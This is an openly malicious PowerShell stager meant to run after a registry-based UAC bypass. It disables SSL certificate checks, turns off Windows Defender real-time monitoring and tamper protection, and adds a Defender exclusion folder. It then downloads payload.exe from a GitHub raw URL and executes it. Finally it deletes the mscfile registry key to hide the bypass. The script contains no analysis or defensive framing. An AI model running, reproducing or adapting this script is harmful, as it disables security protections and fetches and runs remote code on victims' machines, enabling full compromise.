# This script runs with administrative privileges from the UAC bypass.

# --- Step 0: Bypass All SSL Certificate Validation ---
if (-not ([System.Management.Automation.PSTypeName]'ServerCertificateValidationCallback').Type) {
    $certCallback = @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class ServerCertificateValidationCallback {
    public static void Ignore() {
        if(ServicePointManager.ServerCertificateValidationCallback ==null) {
            ServicePointManager.ServerCertificateValidationCallback += delegate (
                Object obj, X509Certificate certificate, X509Chain chain,
                SslPolicyErrors errors) {
                return true;
            };
        }
    }
}
"@
    Add-Type $certCallback
}
[ServerCertificateValidationCallback]::Ignore()

# --- Step 1: Verify and create directory if needed ---
$downloadPath = "C:\Users\Public\Downloads"
if (-not (Test-Path $downloadPath)) {
    New-Item -ItemType Directory -Path $downloadPath -Force
}

# --- Step 2: Aggressively Disable Windows Defender (with better error handling) ---
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    "Defender real-time monitoring disabled" | Out-File "$downloadPath\script.log" -Append
} catch {
    "Failed to disable real-time monitoring: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}

try {
    Add-MpPreference -ExclusionPath $downloadPath -Force
    "Defender exclusion added" | Out-File "$downloadPath\script.log" -Append
} catch {
    "Failed to add exclusion: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}

try {
    # Note: DisableTamperProtection often requires different methods in newer Windows
    Set-MpPreference -DisableTamperProtection $true -Force -ErrorAction SilentlyContinue
    "Tamper protection modification attempted" | Out-File "$downloadPath\script.log" -Append
} catch {
    "Tamper protection modification failed (may require other methods): $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}

# --- Step 3: Download and Execute the Main Payload ---
$payloadURL = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
$savePath = "$downloadPath\payload.exe"

try {
    Invoke-WebRequest -Uri $payloadURL -OutFile $savePath -ErrorAction Stop
    "Payload downloaded successfully" | Out-File "$downloadPath\script.log" -Append
    
    if (Test-Path $savePath) {
        # Fixed syntax: removed backslash from -NoNewWindow
        $process = Start-Process -FilePath $savePath -NoNewWindow -PassThru
        "Payload started with PID: $($process.Id)" | Out-File "$downloadPath\script.log" -Append
    } else {
        "Downloaded file not found" | Out-File "$downloadPath\error.log" -Append
    }
} catch {
    "Download/execution failed: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}

# --- Step 4: Clean Up the Registry Bypass Key ---
Start-Sleep -Seconds 5  # Increased sleep for better process initialization

$registryPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
try {
    if (Test-Path $registryPath) {
        Remove-Item -Path $registryPath -Recurse -Force -ErrorAction Stop
        "Registry cleanup completed successfully" | Out-File "$downloadPath\script.log" -Append
    } else {
        "Registry path not found: $registryPath" | Out-File "$downloadPath\script.log" -Append
    }
} catch {
    "Registry cleanup failed: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}
